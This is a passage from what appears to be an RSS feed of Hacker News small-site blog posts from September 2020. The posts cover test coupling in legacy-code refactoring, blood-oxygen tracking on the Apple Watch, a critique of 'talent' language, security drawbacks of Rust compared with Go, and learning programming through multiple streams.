  <a href="https://understandlegacycode.com/static/bd63ef2c6acd3593772299721368505b/73963/everybody-has-a-plan.jpg" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="" everybody="" has="" a="" until="" they="" get="" punched="" in="" the="" from="" mike="" title="" src="https://understandlegacycode.com/static/bd63ef2c6acd3593772299721368505b/88218/everybody-has-a-plan.jpg" srcset="https://understandlegacycode.com/static/bd63ef2c6acd3593772299721368505b/7237a/everybody-has-a-plan.jpg 148w,https://understandlegacycode.com/static/bd63ef2c6acd3593772299721368505b/0cfdf/everybody-has-a-plan.jpg 295w,https://understandlegacycode.com/static/bd63ef2c6acd3593772299721368505b/88218/everybody-has-a-plan.jpg 590w,https://understandlegacycode.com/static/bd63ef2c6acd3593772299721368505b/73963/everybody-has-a-plan.jpg 600w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    </undefined></p><p>This is when I realized this seemed to be a widespread pattern for node.js developers using mocha:</p><pre data-language="js" data-index="0"><p><code><span><span>describe</span><span>(</span><span>"some API call"</span><span>, </span><span>function</span><span>() {</span></span>
<span><span>  </span><span>let</span><span> </span><span>response</span></span>
<span></span>
<span><span>  </span><span>before</span><span>(</span><span>done</span><span> </span><span>=&gt;</span><span> {</span></span>
<span><span>    </span><span>// System Under Test is called in the `before()` hook</span></span>
<span><span>    </span><span>request</span><span>.</span><span>get</span><span>(</span><span>"/some/api/path"</span><span>).</span><span>end</span><span>((</span><span>err</span><span>, </span><span>res</span><span>) </span><span>=&gt;</span><span> {</span></span>
<span><span>      </span><span>response</span><span> = </span><span>res</span></span>
<span><span>      </span><span>response</span><span>.</span><span>json</span><span> = </span><span>JSON</span><span>.</span><span>parse</span><span>(</span><span>res</span><span>.</span><span>text</span><span>)</span></span>
<span><span>      </span><span>done</span><span>(</span><span>err</span><span>)</span></span>
<span><span>    })</span></span>
<span><span>  })</span></span>
<span></span>
<span><span>  </span><span>// Assertions are spread across different `it()`</span></span>
<span><span>  </span><span>it</span><span>(</span><span>"returns a 404"</span><span>, () </span><span>=&gt;</span><span> {</span></span>
<span><span>    </span><span>expect</span><span>(</span><span>response</span><span>.</span><span>statusCode</span><span>).</span><span>to</span><span>.</span><span>equal</span><span>(</span><span>404</span><span>)</span></span>
<span><span>  })</span></span>
<span></span>
<span><span>  </span><span>it</span><span>(</span><span>"returns an empty array of foo"</span><span>, () </span><span>=&gt;</span><span> {</span></span>
<span><span>    </span><span>expect</span><span>(</span><span>response</span><span>.</span><span>foo</span><span>).</span><span>to</span><span>.</span><span>be</span><span>.</span><span>instanceof</span><span>(</span><span>Array</span><span>)</span></span>
<span><span>    </span><span>expect</span><span>(</span><span>response</span><span>.</span><span>foo</span><span>).</span><span>to</span><span>.</span><span>have</span><span>.</span><span>length</span><span>(</span><span>0</span><span>)</span></span>
<span><span>  })</span></span>
<span><span>})</span></span></code></p></pre><p>The code is executed in the <code>before()</code> hook. Then, assertions are spread across <code>it()</code>.</p><p>On paper, it may look nice. It works and there’s kind of a relationship between the “execution” and the remaining <code>it()</code>. Also, code is executed once, so it’s faster. And for integration tests, that surely makes a difference, right?</p><p>Well, the problem is this is preventing more ambitious optimizations:</p><ul><li>Now you can’t “just parallelize” the tests anymore</li><li>You can’t wipe out the database between each test</li><li>In fact, tests are now coupled, and you can’t easily tell that statically, you need to read the code</li></ul><h2 id="stop-think-and-revise"><a href="#stop-think-and-revise" aria-label="stop think and revise permalink"></a>Stop, think and revise</h2><p>My first thought was:</p><blockquote><p>Well, these tests are all coupled and it’s bad. I should start decoupling them first!</p></blockquote><p>And I actually started to do that. But I started a 1h timer for this.</p><p>After 1h, I stopped and I reflected on my progress. It turned out that cleaning up the tests wasn’t an easy task — who could have guessed…</p><p>I realized that <strong>I wouldn’t be able to achieve this in 2 days!</strong></p><p>So I stopped, reverted my work, and thought about the problem again.</p><p>Sure, getting all of these tests decoupled would be ideal. But doing that would take too much time. So much time that it wouldn’t make it up for the time it would save to developers! The fact is: we don’t touch <em>all of these tests</em> most of the time (although I don’t know which tests we’ll need to touch in the future).</p><p>At some point, we decided to use this pattern. Now, it’s costing us, slowing us down a bit every day. But recovering from that would take too much time. This refactoring would only start paying off in a few years (maybe).</p><p>Thinking about the problem again, I tried to determine if I could apply <a href="https://en.wikipedia.org/wiki/Pareto_principle">the Pareto principle</a>:</p><blockquote><p>Roughly 80% of the benefits come from 20% of the efforts.</p></blockquote><p>Time’s wasted today because:</p><ol><li>Developers have to think about cleaning up the database themselves</li><li>Developers have to figure out how to clean up their data</li></ol><p>In fact, providing a helper function to simply “clean up the database” would solve a good part of the problem!</p><p>Sure, developers will still have to think about cleaning up the DB themselves. But doing so would be easy. Also, there would be only one function to maintain if the database structure ever changes.</p><h2 id="happy-ending"><a href="#happy-ending" aria-label="happy ending permalink"></a>Happy ending</h2><p>I was able to ship this change before the deadline and even tackle other topics in the remaining time. The end result wasn’t the one I announced, but I explained my findings and the decisions I had taken. I also <a href="https://understandlegacycode.com/blog/earn-maintainers-esteem-with-adrs">documented all that in an ADR</a>, so we can easily revisit this decision in the future.</p><p>Was it wasted time? I think not:</p><ul><li>I shipped something that will save time to developers nevertheless</li><li>I learned something along the way</li><li>I documented that learning somewhere reliable, so we can change our mind later</li><li>I moved to other refactoring opportunities</li></ul><p>I think that was a good week, and I wish to have more wins like this 💪</p><h2 id="lessons-to-be-learned"><a href="#lessons-to-be-learned" aria-label="lessons to be learned permalink"></a>Lessons to be learned</h2><p>To be honest, this could have easily turned into a nightmare if it wasn’t for the good habits I developed over time.</p><p>Here’s my recap’ of the things that helped me win the day when the odds were against me. They can help you too:</p><ol><li><strong>Have a clear goal in mind before starting refactoring</strong>. I like using <a href="https://understandlegacycode.com/blog/a-process-to-do-safe-changes-in-a-complex-codebase">the Mikado Method</a> for that. Or simply dropping my thoughts on a piece of paper, to keep track of what I’m doing.</li><li><strong>Timebox yourself</strong>. Especially when you’re not familiar with what you’re about to do. Decide to go for one hour. Then stop, go have a drink, and think about your problem again. Are you heading in a good direction? What if you retried? Would you have a better way?</li><li><strong>Don’t be afraid to throw away what you did and start over</strong>. Timebox helps with that!</li><li><strong>Do the best you can in the allocated time</strong>. Be mindful of your deadline.</li><li><strong>Communicate with your team</strong>. Share your findings. Document your decisions.</li><li><strong>Know when to stop</strong>. Especially if you’ve already invested long hours. This is when you need to take a step back and think again. Can you bring 80% of the value in time, even if it’s not perfect?</li><li><strong>Some refactorings don’t worth it</strong>. Legacy Code isn’t perfect and that’s fine. The game is about making it better, even if it’s just a little bit.</li></ol><p>Being able to work with Legacy Code when you have a short deadline isn’t easy, it takes practice. That’s why I’m crafting a kit that would guide you to refactor your Legacy codebase in no time.</p><p><strong>Interested? Leave me your email</strong> so I can tell you when it’s out 👇</p></div></div>]]>
            </description>
            <link>https://understandlegacycode.com/blog/when-should-you-stop-refactoring-legacy-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24545911</guid>
            <pubDate>Mon, 21 Sep 2020 17:13:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Does the Apple Watch 6 oximeter matter? (yes)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24545892">thread link</a>) | @tuke
<br/>
September 21, 2020 | https://7fff.com/2020/09/does-the-apple-watch-6-oximeter-matter/ | <a href="https://web.archive.org/web/*/https://7fff.com/2020/09/does-the-apple-watch-6-oximeter-matter/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <p>I'm not sure people realize what a boon the Apple Watch's oximeter (blood oxygen app) may be to one's tracking of personal health, so I thought I'd provide some example data to provide a feel for what you'll be able to monitor. Of course, a lot will depend on what people discover about the watch's oxygen monitoring: Accuracy, the granularity of data, etc. But I think it's going to be a great help for people who want to understand better the relationship between blood oxygen levels and heart health. Additionally, some people use oximeters to measure their oxygen out of concern for hypoxia that is induced by the novel coronavirus.</p> <p>The TL;DR on this is that with oximeter readings and metrics for heart rate variability, you can get some insights into possible sleep apnea that can increase heart rate variability and potentially cause atrial fibrillation (which can in turn provoke stroke or heart failure).</p> <p>All graphs and charts are shared with the permission of the person who originated the data.</p> <p>So the first image shows the overnight blood oxygen this person has on a typical night using a CPAP machine. This looks good. All SpO2 (peripheral oxygen saturation) values are above 90%. The person's pulse is low. <a href="https://7fff.com/2020/09/does-the-apple-watch-6-oximeter-matter/(https://www.webmd.com/lung/pulse-oximetry-test)">WebMD</a> says: "A blood oxygen level lower than 89% means you may not have enough oxygen in your blood to meet your body's needs. This could be because there’s a problem with your heart or lungs." These values were collected with a <a href="https://getwellue.com/pages/o2ring-oxygen-monitor">Wellue O2Ring</a>.</p> <p><img src="https://7fff.com/assets/images/pulseox1-6d1be445.jpg" title="Normal pulse ox readings" alt="pulseox1" width="750" height="1334"></p> <p>Now, one way you might be starving your brain and body for oxygen is if you have sleep apnea. This person uses a CPAP device every night, but recently when traveling did not have the CPAP. Here's what can go wrong.</p> <p><img src="https://7fff.com/assets/images/pulseox2-d625e53c.jpg" title="pulse ox readings slowing sleep apnea" alt="pulseox2" width="750" height="1334"></p> <p>As you can see in the second image, during sleep apnea, one's blood oxygen level can spike way down.</p> <p>Prolonged episodes of sleep apnea can cause a lot of problems. The <a href="https://www.mayoclinic.org/diseases-conditions/sleep-apnea/symptoms-causes/syc-20377631">Mayo Clinic</a> says: "Sudden drops in blood oxygen levels that occur during sleep apnea increase blood pressure and strain the cardiovascular system. Having obstructive sleep apnea increases your risk of high blood pressure (hypertension). Obstructive sleep apnea might also increase your risk of recurrent heart attack, stroke and abnormal heartbeats, such as atrial fibrillation. If you have heart disease, multiple episodes of low blood oxygen (hypoxia or hypoxemia) can lead to sudden death from an irregular heartbeat."</p> <p>I'm not a doctor, but there are articles (<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3306298/">example</a>) suggesting that prolonged sleep apnea with its impact on blood oxygen can affect heart rate variability (HRV), which would seem to be a leading indicator for issues such as atrial fibrillation (afib) which is a form of cardiac arrhythmia that can lead to a stroke or heart failure. The Apple Watch can track this. Here are three examples of HRV readings from the Apple Health app. The first one shows relatively normal HRV for this person; the second shows elevate readings; and then the third image shows HRV leading up to the onset of afib.</p> <p>Once this person started using a CPAP, the HRV settled down, and the heart reverted from afib to normal "sinus" rhythm.</p> <p>In short, had this person known his or her oxygen levels, there might have been an earlier conversation with a physician leading to some controls (such as better diet, reduced caffiene and alcohol consumption, more exercise, the use of a CPAP machine . . .) that might have reduced the likelihood of afib occurring.</p> <p><img src="https://7fff.com/assets/images/hrv1-916829e7.png" title="normal heart rate variability for this person" alt="hrv1" width="742" height="830"></p> <p><img src="https://7fff.com/assets/images/hrv2-017b02c9.png" title="increased heart rate variability for this person" alt="hrv2" width="742" height="833"></p> <p><img src="https://7fff.com/assets/images/hrv3-eaa53feb.png" title="heart rate variability leading up to afib" alt="hrv3" width="745" height="832"></p>    <p><a href="http://disqus.com/">comments powered by </a>  </p></div></div>]]>
            </description>
            <link>https://7fff.com/2020/09/does-the-apple-watch-6-oximeter-matter/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24545892</guid>
            <pubDate>Mon, 21 Sep 2020 17:11:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A little rant about talent]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24545379">thread link</a>) | @djhaskin987
<br/>
September 21, 2020 | https://benjiweber.co.uk/blog/2020/09/19/a-little-rant-about-talent/ | <a href="https://web.archive.org/web/*/https://benjiweber.co.uk/blog/2020/09/19/a-little-rant-about-talent/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1502" role="article" itemscope="" itemtype="http://schema.org/BlogPosting">
						
						<header>
						
														
							
							
							<p>Posted <time datetime="2020-09-19" pubdate="">September 19, 2020</time> by  <span>&amp;</span> filed under <a href="https://benjiweber.co.uk/blog/posts/xp/" rel="category tag">XP</a>. <a href="https://twitter.com/benjiweber" data-show-count="false">Follow @benjiweber</a></p>
						
						</header> <!-- end article header -->
					
						<section itemprop="articleBody">
							
<p>It’s become less common to hear people referred to as “resources” in recent times. There’s more trendy <a href="https://getyarn.io/yarn-clip/f89ce89e-3450-417e-a8de-5783353e3d85">“official vocab guidelines”</a>, but what’s really changed? There’s still phrases in common use that sound good but betray the same mindset.</p>



<p>I often hear people striving to <em>“</em><a href="https://www.google.com/search?&amp;q=%22hire%22+and+%22retain%22+%22best+talent%22"><em>hire and retain the best talent</em></a><em>“</em> as if that is a strategy for success, or as if talent is a limited resource we must <a href="https://en.wikipedia.org/wiki/War_for_talent">fight over.</a>&nbsp;</p>



<p>Another common one is to describe employees as your <a href="https://www.google.com/search?q=%22employees%22+%22asset%22"><em>“greatest asset”</em></a>.</p>



<p>I’d like to believe both phrases come from the good intentions of valuing people. Valuing individuals as per the <a href="https://agilemanifesto.org/">agile manifesto</a>. I think these phrases betray a lack of consideration of the <em>“…and&nbsp; interactions”</em>.&nbsp;</p>



<p>The implication is organisations are in a battle to win and then protect as big a chunk as they can of a finite resource called <em>“talent”</em>. It’s positioned as a zero-sum game. There’s an implication that the impact of an organisation is a pure function of the <em>“talent”</em> it has accumulated.&nbsp;</p>



<p>People are not Talent. An organisation can amplify or stifle the brilliance of people.&nbsp;It can grow skills or curtail talent.</p>



<p>Talent is not skill. Talent gets you so far but skills can be grown. Does the team take the output that the people in it have the skill to produce? Or does the team provide an environment in which everyone can increase their skills and get more done than they could alone?&nbsp;</p>



<figure><img src="https://deming.org/wp-content/uploads/2020/06/a-bad-system-will-10091-2.png" alt=""></figure>



<p>We might hire the people with the most pre-existing talent, and achieve nothing if we stifle them with a bureaucracy that prevents them from getting anything done. Organizational <a href="https://m.signalvnoise.com/dont-scar-on-the-first-cut/">scar tissue</a> that gets in the way; policies that demotivate.&nbsp;&nbsp;</p>



<figure></figure>



<p>Even without the weight of bureaucracy many teams are really just collections of individuals with a common manager. The outcomes of such groups <em>are</em> limited by the talent and preexisting skill of the people in them.&nbsp;</p>



<p>Contrast this with a team into which you can hire brilliant people who’ve <a href="https://benjiweber.co.uk/blog/2020/09/06/reasons-to-hire-inexperienced-engineers/">yet to have the opportunity</a> of being part of a team that grows them into highly skilled individuals. A team that gives everyone space to learn, provides challenges to stretch everyone, provides an environment where it’s safe to fail. Teams that have practices and habits that enable them to achieve great things <em>despite</em> the fallibility and limitations of the talent of each of the people in the team.&nbsp;</p>



<blockquote><p><em>“when you are a Bear of Very Little Brain, and you Think of Things, you find sometimes that a Thing which seemed very Thingish inside you is quite different when it gets out into the open and has other people looking at it.”</em>—AA Milne&nbsp;</p></blockquote>



<p>While I’m a bear of very little brain, I’ve had the opportunity to be part of great teams that have taught me habits that help me achieve more than I can alone. </p>



<p>Habits like giving and receiving feedback. Like working <em><a href="https://cucumber.io/blog/bdd/inclusive-benefits-of-mob-programming/">together</a></em> to balance each others weaknesses and learn from each other faster. Like making predictions and observing the results. Like investing in keeping <a href="https://www.amazon.co.uk/Domain-Driven-Design-Tackling-Complexity-Software/dp/0321125215">things simple</a> so they can fit into my brain. Like working in <a href="https://benjiweber.co.uk/blog/2020/02/12/do-you-ci/">small steps</a>. Like scheduled <a href="https://www.youtube.com/watch?time_continue=4&amp;v=tImsExfrTPA">reflection points</a> to consider how to improve <a href="https://retrospectivewiki.org/index.php?title=Agile_Retrospective_Resource_Wiki"><em>how</em> we’re working</a>. Like occasionally <a href="https://benjiweber.co.uk/blog/2018/03/17/hack-days-removing-the-rules/" data-type="URL" data-id="https://benjiweber.co.uk/blog/2018/03/17/hack-days-removing-the-rules/">throwing away the rules</a> and seeing what happens.</p>



<p>Habits like <a href="https://www.geepawhill.org/tdd/geekery-pro-tip-think-less-sense-more/">thinking less and sensing more.&nbsp;</a></p>
							
												
						</section> <!-- end article section -->
						
						 <!-- end article footer -->
					
					</article></div>]]>
            </description>
            <link>https://benjiweber.co.uk/blog/2020/09/19/a-little-rant-about-talent/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24545379</guid>
            <pubDate>Mon, 21 Sep 2020 16:33:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Not Rust for Security?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24545020">thread link</a>) | @baby
<br/>
September 21, 2020 | https://www.cryptologie.net/article/505/why-not-rust-for-security/ | <a href="https://web.archive.org/web/*/https://www.cryptologie.net/article/505/why-not-rust-for-security/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>I read a <a href="https://matklad.github.io/2020/09/20/why-not-rust.html">Why Not Rust?</a> article the other day that was quite good but dismissed the most important reason to use a language to me: <strong>security</strong>. After having worked on a Rust codebase for almost two years now, I thought I would chime in, even though I'll preface the post by saying that Rust is totally the right language you should use if you know what you're doing and are aiming for performance and security, yet I still have some pain points that will make me recommend <a href="https://golang.org/">Golang</a> over Rust sometimes. Keep in mind that I have also spent my whole career looking for bugs in applications written in dozens of different languages, so my post might be highly controversial but it has to be looked from these lenses.</p>
<h2>Shallow standard library</h2>
<p>Working with Rust is like working with Javascript in many ways. While the package manager Cargo is truly awesome, the fact that the standard library misses most features will have you import many third-party dependencies. These dependencies in turn import other third-party dependencies, that import other third-party dependencies, and so on. This blow up of dependencies can quickly become a nightmare, and this is of course a perfect vector of attack for backdoors, like we've seen happen before in javascript land (<a href="https://www.infoq.com/news/2018/05/npm-getcookies-backdoor">https://www.infoq.com/news/2018/05/npm-getcookies-backdoor</a>/, <a href="https://www.zdnet.com/article/hacker-backdoors-popular-javascript-library-to-steal-bitcoin-funds">https://www.zdnet.com/article/hacker-backdoors-popular-javascript-library-to-steal-bitcoin-funds</a>/).</p>
<p>Not only this, but if you're a newcomer to Rust, how do you even pick the right library? I can't even fathom how anyone writing a project in Rust gets to pick a good library for generating cryptographic random numbers, or for doing any type of crypto like encrypting or hashing, or for decoding hex strings, or for decoding JSON, or for using TCP, or even for using TLS! On the other hand Golang has all of that in its standard library, that means that when you use Golang you:</p>
<ul>
<li>can't pick the wrong algorithm (e.g. DES instead of AES)</li>
<li>can't pick a bad implementation (the standard library is known to be high quality) </li>
<li>can't pick a dependency that ends up importing plenty of other third-party dependencies (unlike Rust, the Golang standard library never imports third-party libraries)</li>
<li>don't have to worry about version updates (you're just updating your version of Golang instead of the versions of many dependencies)</li>
<li>don't have to worry about transitive dependencies that you can't update (again, Golang standard library doesn't rely on third-party dependencies)</li>
</ul>
<p>For <a href="http://libra.org/">Libra</a> we've used a number of techniques in order to reduce the number of third-party dependencies we use. This included figuring out when we used different dependencies that did the same thing, or figuring out what obscure dependencies we should avoid, we even re-wrote a large number of dependencies to avoid dependencies that ended up exploding the number of transitive third-party dependencies we imported. One useful tool we used for some of that is <a href="https://github.com/mimoo/cargo-dephell">dephell</a> which is built on top of <a href="https://github.com/facebookincubator/cargo-guppy">guppy</a>.</p>
<h2>Rustfmt is imperfect</h2>
<p><code>rustfmt</code> is great, but <code>rustfmt</code> sucks. Why does it suck? Two reasons: </p>
<ul>
<li>it's not mandatory</li>
<li>it's configurable</li>
</ul>
<p>On the other hand, Golang's compiler is very strict and will yell at you early on if you have dead code, unused dependencies, badly formatted code, and so on. It doesn't replace <code>gofmt</code>, but it's much more opinionated and is much more effective at making Golang's codebases more readable (especially if they forget to run <code>gofmt</code>). In addition, if you do use <code>gofmt</code>, you can't configure it! This is very apparent when you read Golang code, it always looks the same! And it is pretty fucking fantastic if you ask me, because not only Golang is easy to learn, but you can quickly get used to any Golang codebase due to the consistent formatting of the language.</p>
<h2>Too many ways to do things</h2>
<p>Rust has a somewhat different syntax from other languages of its genre, and you sometimes see things that you might not be used to see (statement as expression, match statements, lifetimes, etc.) I couldn't care less about these, these are things you can learn, and you end up getting used to them. What I can't get used to is the sheer number of ways to do something. There are so many keywords in Rust, and there's so many ways to end up bike shedding on the best way to write the exact same statement, that I consider it a waste of time. It's a waste of time for the developers, but also for the reviewers who will often run into keywords that they've never seen before. For example, there are too many ways to panic on purpose: <code>panic!()</code>, <code>unwrap()</code>, <code>except()</code>, <code>unreachable!()</code>, <code>todo!()</code>, <code>unimplemented!()</code>, <code>assert!()</code>, and so on. </p>
<h2>Generics and macros</h2>
<p>Rust is too expressive. This is of course great for some use-cases, but holy shit if a developer wants to be too clever, they can create the most unintelligible codebase that you'll ever seen. This is probably the most controversial point, but security is not just safety, it's also readability. As we say "complexity is the enemy of security", and generics undeniably add complexity. This is of course up to the developers to abuse them, but the great thing about Golang is that there aren't many things to abuse, codebases are often straight forward and you can quickly understand what is happening.</p>
<h2>Ok, you're being unreasonable David</h2>
<p>Sure, I'm omitting a lot of good Rust things in here, but this is a post about the security downsides of Rust, not the upsides, which let's be clear still make Rust the perfect language to write a sensitive application in. You just need to know what you're doing. This also means that Rust has a lot of room to mature, while generics are here to stay, there is no excuse to keep slipping the shallow stdlib under the rug.</p>
</article></div>]]>
            </description>
            <link>https://www.cryptologie.net/article/505/why-not-rust-for-security/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24545020</guid>
            <pubDate>Mon, 21 Sep 2020 16:07:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Accelerate Your Programming Knowledge with Multiple Streams of Learning]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24545001">thread link</a>) | @amymhaddad
<br/>
September 21, 2020 | https://amymhaddad.com/how-to-accelerate-your-programming-knowledge-with-multiple-streams-of-learning | <a href="https://web.archive.org/web/*/https://amymhaddad.com/how-to-accelerate-your-programming-knowledge-with-multiple-streams-of-learning">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>By: <!-- -->Amy M Haddad</p><p><span>
      <a href="https://amymhaddad.com/static/7be8990592137205b0e20bd22650fe8b/faddd/msl.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="image" title="image" src="https://amymhaddad.com/static/7be8990592137205b0e20bd22650fe8b/6aca1/msl.jpg" srcset="https://amymhaddad.com/static/7be8990592137205b0e20bd22650fe8b/d2f63/msl.jpg 163w,https://amymhaddad.com/static/7be8990592137205b0e20bd22650fe8b/c989d/msl.jpg 325w,https://amymhaddad.com/static/7be8990592137205b0e20bd22650fe8b/6aca1/msl.jpg 650w,https://amymhaddad.com/static/7be8990592137205b0e20bd22650fe8b/faddd/msl.jpg 850w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p><p>Financial gurus talk about having multiple streams of income. The idea is to have income from several sources, rather than relying on a single one. We ought to embody a similar principle when learning programming topics and building programming skills.</p><p>My recommendation is to apply an approach that I like to call “multiple streams of learning,” or MSL. It means to actively study a field or build a skill from multiple perspectives.</p><p><span>
      <a href="https://amymhaddad.com/static/5bd12c1d3ccc30a6566778475a649a91/faddd/msl1.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="image" title="image" src="https://amymhaddad.com/static/5bd12c1d3ccc30a6566778475a649a91/6aca1/msl1.jpg" srcset="https://amymhaddad.com/static/5bd12c1d3ccc30a6566778475a649a91/d2f63/msl1.jpg 163w,https://amymhaddad.com/static/5bd12c1d3ccc30a6566778475a649a91/c989d/msl1.jpg 325w,https://amymhaddad.com/static/5bd12c1d3ccc30a6566778475a649a91/6aca1/msl1.jpg 650w,https://amymhaddad.com/static/5bd12c1d3ccc30a6566778475a649a91/faddd/msl1.jpg 850w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p><p>This is in contrast to the more common approach to learning, which I think of as a “siloed” approach to learning. It’s when you focus exclusively on a single form of learning, say a course or project, for example, and only that course or project.</p><p><span>
      <a href="https://amymhaddad.com/static/d7ec5e7eb86bdccd38b3c95d26487be2/faddd/msl2.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="image" title="image" src="https://amymhaddad.com/static/d7ec5e7eb86bdccd38b3c95d26487be2/6aca1/msl2.jpg" srcset="https://amymhaddad.com/static/d7ec5e7eb86bdccd38b3c95d26487be2/d2f63/msl2.jpg 163w,https://amymhaddad.com/static/d7ec5e7eb86bdccd38b3c95d26487be2/c989d/msl2.jpg 325w,https://amymhaddad.com/static/d7ec5e7eb86bdccd38b3c95d26487be2/6aca1/msl2.jpg 650w,https://amymhaddad.com/static/d7ec5e7eb86bdccd38b3c95d26487be2/faddd/msl2.jpg 850w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p><p>MSL may seem obvious. But few people follow it. More often than not, people take the siloed approach to learning. They zero in on a single form of learning and let everything else fall to the wayside.</p><p>Some examples of familiar excuses include:</p><ul><li>Get feedback? There’s no time for it.</li><li>Read technical books? Maybe sometime in the future.</li><li>Meet with peers to discuss programming topics and ask questions? Perhaps in an ideal world.</li><li>Read and study the code of others who’ve solved the same problem, and apply what you learn? Not now.</li></ul><p>In this blog post I argue that MSL is the approach to use when it comes to learning and skill-building.</p><p>A programmer I know is learning computer science. He’s enrolled in an online curriculum, which includes the standard lectures and assignments.</p><p>For most people, the learning would stop there. They’d focus entirely on the course, and only the course. They unconsciously opt for the siloed approach to learning.</p><p>Not this programmer. His coursework is one avenue for learning computer science—but definitely not the only one.</p><p>He spends a significant amount of time working on other related projects and problems. He and two classmates meet virtually once per week to talk about computer science topics and ask questions. He also meets virtually with a classmate to work through problems and get feedback. And, until recently, he led a reading group that discussed and analyzed technical books.</p><p>This programmer exemplifies MSL. He’s actively attacking computer science from multiple angles. This helps to foster connections, solidify concepts, and increase the learning rate.</p><p>So he’s learning the material, to be sure. But there’s something more.</p><p>He’s also seeing the field of computer science from many perspectives—the instructors, classmates, authors of technical books, and peers—instead of a single one. This plurality of viewpoints not only helps foster an open mind. But it also helps you pick up on the details: what’s overlooked or confusing in one context is made concrete in another.</p><p>This is MSL in action.</p><p>The idea of MSL was born out of necessity during my mid-twenties, when I decided to go to graduate school to study art history.</p><p>There was a challenge, however. I had no industry experience in the arts and, other than a few classes in college, I had very little knowledge of the field. I had a lot of work to do just to get <em>into</em> graduate school.</p><p>To get up to speed, I took some classes. But a significant part of my education took place <em>outside</em> of the classroom where I was actively engaged in the art world.</p><p>I became a docent at the local museum, where I gave tours about the museum’s art collection and current exhibitions; experienced art in the flesh (which is far better than seeing it on a slide projected on a flat wall); and learned the ins and outs of museum life.</p><p>I also became a research assistant for an art history professor. This experience helped to sharpen my researching and writing skills, and gave me an academic’s perspective of the art world. Then, there was the art history reading group, where about ten of my classmates (from the university where I took supplemental classes) engaged in intense conversations on dense theoretical texts.</p><p>Art was constantly on my mind in many different ways. As a result, my knowledge soared.</p><p>Of course, at the time, I didn’t have a name for my learning approach. I was just trying to learn as much as possible, and actively engaging in a variety of pursuits from multiple angles seemed like a way to do it.</p><p>So I continued this approach once I was enrolled in graduate school. This time I decided to launch a blog about the arts.</p><p>I took it as an opportunity to interview gallerists, curators, and artists, who were more than willing to talk and answer my questions. I attended art exhibitions by the dozens, and traveled to art studios. Then, I’d come back to my apartment and write a blog post.</p><p>Once again, my knowledge soared. This is how I learned about curating an art show and how artists work and think. It’s also how I got my start as a writer.</p><p>Fast forward a few years and I began another self-study pursuit: learning to program. You may think I began my journey with MSL.</p><p>But that’s not what happened.</p><p>I can’t explain <em>why</em> I didn’t begin learning to program with the approach that served me well in learning the art field. It simply escapes me.</p><p>Instead, I began my self-taught programming journey with the siloed approach to learning. It didn’t work.</p><p>Three months in, I did a complete reboot and restarted my programming journey from scratch. That’s because my first attempt was not effective, due to poor learning techniques and an inadequate learning strategy.</p><p>During round two of learning to program, I took time to learn how to learn, that way I had the strategies at hand to learn technical topics better. I also developed an overall learning strategy that involved MSL.</p><h2>How to Make it a Reality</h2><p>You can apply MSL to a particular field, like the programmer who’s learning computer science. You can also apply it to a concept or technology you’re trying to learn, or skill you’re trying to build.</p><p>Either way, the idea is the same: identify what you want to learn or get better at. Then, actively attack it from multiple angles.</p><p>When I first began to program, I followed the oft-cited advice for getting better at problem-solving: solve lots of problems. So I took the siloed approach toward problem-solving and only focused on solving as many problems as possible.</p><p>But repetition is only part of the story, as I came to find out. Repetition alone won’t get you there. You’ve got to be <em>intentional</em> about your practice, which I explain in my article about <a href="https://amymhaddad.com/how-to-get-better-at-solving-programming-problems">how to get better at problem-solving</a>.</p><p>Now my problem-solving approach is multifaceted.</p><p><span>
      <a href="https://amymhaddad.com/static/f7f8c1a21d0245f1ed425c4bdb4ffd25/faddd/ps3.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="image" title="image" src="https://amymhaddad.com/static/f7f8c1a21d0245f1ed425c4bdb4ffd25/6aca1/ps3.jpg" srcset="https://amymhaddad.com/static/f7f8c1a21d0245f1ed425c4bdb4ffd25/d2f63/ps3.jpg 163w,https://amymhaddad.com/static/f7f8c1a21d0245f1ed425c4bdb4ffd25/c989d/ps3.jpg 325w,https://amymhaddad.com/static/f7f8c1a21d0245f1ed425c4bdb4ffd25/6aca1/ps3.jpg 650w,https://amymhaddad.com/static/f7f8c1a21d0245f1ed425c4bdb4ffd25/faddd/ps3.jpg 850w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
